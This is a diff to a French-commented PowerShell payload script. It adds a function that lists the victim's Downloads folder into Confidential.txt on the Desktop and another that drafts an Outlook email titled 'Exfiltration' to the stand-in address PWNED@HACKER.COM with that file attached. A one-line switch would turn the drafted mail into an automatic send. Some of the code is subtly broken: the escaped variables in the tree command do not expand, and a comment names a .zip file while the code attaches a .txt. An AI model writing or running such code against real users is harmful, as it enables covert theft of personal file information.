@@ -2,6 +2,8 @@ function Payload_Launch {
 
     CreateWarningSlideshow
     OpenNotepad
+    DownloadsTree
+    OutlookNewMail
 
 }
 
@@ -109,11 +111,51 @@ public class Wallpaper {
 }
 
 
-# Ouvre un nouveau mail via Outlook
+function DownloadsTree {
+    # Chemin du dossier Téléchargements
+    $downloadsPath = [Environment]::GetFolderPath('UserProfile') + "\Téléchargements"
+
+    # Chemin du fichier Confidential.txt sur le bureau
+    $desktopPath = [Environment]::GetFolderPath('Desktop')
+    $outputFilePath = Join-Path $desktopPath "Confidential.txt"
+
+    # Exécuter la commande 'tree' et rediriger la sortie vers Confidential.txt
+    cmd.exe /c "tree /F /A `$downloadsPath > `$outputFilePath"
+
+    # Message de confirmation
+    Write-Host "Le contenu du dossier Téléchargements a été listé dans $outputFilePath"
+}
+
 function OutlookNewMail {
+    # Créer un nouvel objet Outlook
     $olApp = New-Object -ComObject Outlook.Application
     $mailItem = $olApp.CreateItem(0) # 0: olMailItem
-    $mailItem.Display()
+
+    # Définir les propriétés de l'email
+    $mailItem.To = "PWNED@HACKER.COM"
+    $mailItem.Subject = "Exfiltration"
+    $mailItem.Body = @"
+######## ##     ## ######## #### ##       ######## ########     ###    ######## ####  #######  ##    ## 
+##        ##   ##  ##        ##  ##          ##    ##     ##   ## ##      ##     ##  ##     ## ###   ## 
+##         ## ##   ##        ##  ##          ##    ##     ##  ##   ##     ##     ##  ##     ## ####  ## 
+######      ###    ######    ##  ##          ##    ########  ##     ##    ##     ##  ##     ## ## ## ## 
+##         ## ##   ##        ##  ##          ##    ##   ##   #########    ##     ##  ##     ## ##  #### 
+##        ##   ##  ##        ##  ##          ##    ##    ##  ##     ##    ##     ##  ##     ## ##   ### 
+######## ##     ## ##       #### ########    ##    ##     ## ##     ##    ##    ####  #######  ##    ##
+"@
+
+    # Ajouter la pièce jointe "Confidential.zip" située sur le bureau
+    $desktopPath = [Environment]::GetFolderPath('Desktop')
+    $attachmentPath = Join-Path $desktopPath "Confidential.txt"
+    if (Test-Path $attachmentPath) {
+        $mailItem.Attachments.Add($attachmentPath)
+    } else {
+        Write-Host "Pièce jointe non trouvée : $attachmentPath"
+    }
+
+    # Afficher l'email (optionnel) et envoyer l'email
+    $mailItem.Display()  # Affiche l'email (vous pouvez le commenter si vous voulez envoyer directement)
+    # $mailItem.Send()   # Envoyer l'email directement (décommenter cette ligne pour envoyer l'email)
 }
 
 Payload_Launch
